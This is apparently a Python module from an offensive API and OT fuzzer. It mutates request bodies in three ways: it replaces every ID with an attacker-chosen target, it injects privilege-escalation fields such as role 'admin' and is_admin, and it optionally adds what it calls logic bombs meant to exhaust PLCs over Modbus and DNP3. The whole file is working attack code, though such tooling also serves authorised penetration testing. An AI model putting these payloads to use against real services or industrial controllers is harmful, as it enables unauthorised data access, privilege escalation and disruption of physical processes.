import copy

MASS_ASSIGNMENT_PAYLOADS = {
    "role": "admin",
    "is_admin": True,
    "permissions": ["all", "read", "write", "delete"],
    "account_type": "premium",
    "group_id": 1
}

OT_LOGIC_BOMBS = {
    "register_id": 9999999,      # Modbus out of bounds
    "holding_registers": [0xFFFF] * 10000,  # Memory exhaustion logic bomb
    "coil_state": 255,           # Invalid boolean
    "dnp3_obj_group": 255,       # Invalid DNP3 group
    "poll_rate_ms": -1,          # Invalid timing crash
    "device_address": 0x00       # Broadcast storm abuse
}

def mutate_payload(payload: dict, target_id: str, ot_mode: bool = False) -> dict:
    """
    Toma un payload base y realiza inyecciones simultáneas:
    1. BOLA: Reemplaza todos los IDs/UUIDs encontrados por el `target_id`.
    2. Mass Assignment: Inyecta propiedades de elevación de privilegios en la raíz.
    3. OT Exhaustion (Si ot_mode=True): Inyecta Logic Bombs para agotar PLCs.
    """
    if not payload:
        return None
        
    mutated = copy.deepcopy(payload)
    
    # 1. BOLA Recursivo con Geometría (Geometry-Aware Payload)
    def fuzz_ids(obj, depth=0):
        if depth > 20:
            return obj
        import re
        import uuid
        
        if isinstance(obj, dict):
            new_obj = {}
            for k, v in obj.items():
                if isinstance(v, (dict, list)):
                    new_obj[k] = fuzz_ids(v, depth + 1)
                elif isinstance(v, (int, str)) and ('id' in k.lower() or 'uuid' in k.lower()):
                    v_str = str(v)
                    # Detect Geometry
                    if re.match(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$', v_str):
                        # Shape: UUIDv4
                        new_obj[k] = target_id
                    elif re.match(r'^[0-9a-fA-F]+$', v_str) and 10 < len(v_str) <= 256:
                        # Shape: Hex Hash (e.g., MongoDB ObjectID)
                        new_obj[k] = target_id
                    elif isinstance(v, int):
                        # Shape: Integer
                        try:
                            new_obj[k] = int(target_id)
                        except ValueError:
                            new_obj[k] = target_id
                    else:
                        # Fallback: Plain String Injection
                        new_obj[k] = target_id
                else:
                    new_obj[k] = v
            return new_obj
        elif isinstance(obj, list):
            return [fuzz_ids(i, depth + 1) for i in obj]
        return obj

    mutated = fuzz_ids(mutated)
    
    # 2. Mass Assignment Inyección Recursiva
    def inject_ma(obj, depth=0):
        if depth > 20:
            return obj
        if isinstance(obj, dict):
            new_obj = copy.copy(obj)
            for key, value in MASS_ASSIGNMENT_PAYLOADS.items():
                if key not in new_obj:
                    new_obj[key] = value
            for k, v in new_obj.items():
                if isinstance(v, (dict, list)):
                    new_obj[k] = inject_ma(v, depth + 1)
            return new_obj
        elif isinstance(obj, list):
            return [inject_ma(i, depth + 1) for i in obj]
        return obj

    mutated = inject_ma(mutated)
    
    # 3. OT Protocol Exhaustion Inyección Recursiva
    if ot_mode:
        def inject_ot(obj, depth=0):
            if depth > 20:
                return obj
            if isinstance(obj, dict):
                new_obj = copy.copy(obj)
                for key, value in OT_LOGIC_BOMBS.items():
                    if key not in new_obj:
                        new_obj[key] = value
                for k, v in new_obj.items():
                    if isinstance(v, (dict, list)):
                        new_obj[k] = inject_ot(v, depth + 1)
                return new_obj
            elif isinstance(obj, list):
                return [inject_ot(i, depth + 1) for i in obj]
            return obj
            
        mutated = inject_ot(mutated)
        
    return mutated
